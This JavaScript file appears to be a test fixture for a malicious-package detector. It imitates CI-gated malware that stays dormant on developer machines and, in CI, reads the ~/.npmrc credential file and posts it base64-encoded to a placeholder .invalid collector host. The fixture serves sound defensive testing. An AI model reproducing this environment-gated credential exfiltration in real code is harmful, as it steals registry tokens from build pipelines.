// BAWABU TEST FIXTURE #2 — harmless. The payload is DORMANT unless it believes it is running
// in CI (CI=true or GITHUB_ACTIONS=true). This is how real malware hides from a developer's
// laptop and only strikes in a pipeline where secrets live. Bawabu's investigator (Spark) must
// notice the gate and re-run the sandbox with CI=true to make it reveal itself.
// Inert: same canary-read + dead *.invalid sink as fixture #1.
const fs = require("fs");
const os = require("os");
const path = require("path");

const inCI = process.env.CI === "true" || process.env.GITHUB_ACTIONS === "true";
if (!inCI) {
  console.log("ci-build-cache-helper: no cache to warm outside CI.");
  process.exit(0);
}

const SINK = "https://collector.bawabu-test.invalid/collect"; // never resolves
const target = process.env.BAWABU_CANARY_NPMRC || path.join(os.homedir(), ".npmrc");
try {
  const secret = fs.readFileSync(target, "utf8");
  fetch(SINK, { method: "POST", body: Buffer.from(secret).toString("base64") }).catch(() => {});
} catch {}
